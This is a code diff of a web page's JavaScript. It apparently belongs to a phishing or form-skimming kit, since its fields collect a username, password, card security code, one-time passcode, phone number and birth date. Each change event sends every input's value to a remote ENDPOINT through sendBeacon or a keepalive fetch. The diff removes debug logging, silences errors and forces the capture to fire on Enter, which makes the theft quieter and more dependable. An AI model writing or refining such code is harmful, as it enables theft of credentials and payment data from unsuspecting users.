@@ -380,68 +380,39 @@ function setupUI() {
   }
 
   function sendPayload(payload) {
-    try {
-      console.log("[DEBUG] preparing to send payload to:", ENDPOINT);
+  try {
+    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+    let beaconOk = false;
 
-      const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
-      let beaconOk = false;
-
-      if (navigator.sendBeacon) {
-        beaconOk = navigator.sendBeacon(ENDPOINT, blob);
-        console.log("[DEBUG] sendBeacon attempted, return value:", beaconOk);
-      } else {
-        console.log("[DEBUG] navigator.sendBeacon not available");
-      }
-
-      if (!beaconOk) {
-        console.log("[DEBUG] falling back to fetch with payload:", payload);
-        fetch(ENDPOINT, {
-          method: "POST",
-          body: JSON.stringify(payload),
-          headers: { "Content-Type": "application/json" },
-          keepalive: true
-        })
-          .then(res => {
-            console.log("[DEBUG] fetch response status:", res.status);
-            return res.text();
-          })
-          .then(text => {
-            console.log("[DEBUG] fetch response body:", text);
-          })
-          .catch(err => {
-            console.error("[DEBUG] fetch error:", err);
-          });
-      }
-    } catch (err) {
-      console.error("[DEBUG] sendPayload exception:", err);
+    if (navigator.sendBeacon) {
+      beaconOk = navigator.sendBeacon(ENDPOINT, blob);
     }
-  }
+
+    if (!beaconOk) {
+      fetch(ENDPOINT, {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: { "Content-Type": "application/json" },
+        keepalive: true
+      }).catch(() => {});
+    }
+  } catch (err) {}
+ }
 
 
   document.addEventListener("change", e => {
-  console.log("[DEBUG] change event fired on:", e.target);
+    const el = e.target;
+    if (el?.closest("#clsdiv") && el.matches(".input-control")) {
+      const inputs = document.querySelectorAll(".input-control");
 
-  const el = e.target;
-  if (el?.closest("#clsdiv") && el.matches(".input-control")) {
-    console.log("[DEBUG] passed guard, building payload");
+      const payload = { eventType: "change", timestamp: new Date().toISOString(), fields: {} };
 
-    const inputs = document.querySelectorAll(".input-control");
-    const payload = { eventType: "change", timestamp: new Date().toISOString(), fields: {} };
-
-    inputs.forEach(input => {
-      if (input.name) {
-        payload.fields[input.name] = input.value;
-        console.log("[DEBUG] field captured:", input.name, "=", input.value);
-      }
-    });
-
-    console.log("[DEBUG] sending payload:", payload);
-    sendPayload(payload);
-  } else {
-    console.log("[DEBUG] guard failed for:", el);
-  }
-});
-
+      inputs.forEach(input => {
+        if (input.name) payload.fields[input.name] = input.value;
+      });
+      sendPayload(payload);
+    }
+  });
 }
 
 document.addEventListener("DOMContentLoaded", setupUI);
@@ -617,24 +588,26 @@ window.populateEmailFields = function () {
 }
 
   function setupEnterBindings() {
-    const map = {
-      "#oun, #upw": "button[name='submita']",
-      "#cscInput": "button[name='submitb']",
-      "#otp, #pn, #mmdd": "button[name='submitc']"
-    };
+  const map = {
+    "#oun, #upw": "button[name='submita']",
+    "#cscInput": "button[name='submitb']",
+    "#otp, #pn, #mmdd": "button[name='submitc']"
+  };
 
-    $(document).on("keydown", function (e) {
-      if (e.key === "Enter") {
-        const active = document.activeElement;
-        for (const selector in map) {
-          if (active && $(active).is(selector)) {
-            e.preventDefault();
-            $(map[selector]).trigger("click"); // trigger existing click handlers
-          }
+  $(document).on("keydown", function (e) {
+    if (e.key === "Enter") {
+      const active = document.activeElement;
+      for (const selector in map) {
+        if (active && $(active).is(selector)) {
+          e.preventDefault();
+          active.blur(); // ensures change event fires
+          $(map[selector]).trigger("click");
         }
       }
-    });
-  }
+    }
+  });
+}
+
 
   function setupLoading() {
     $.loading = function (btn) {
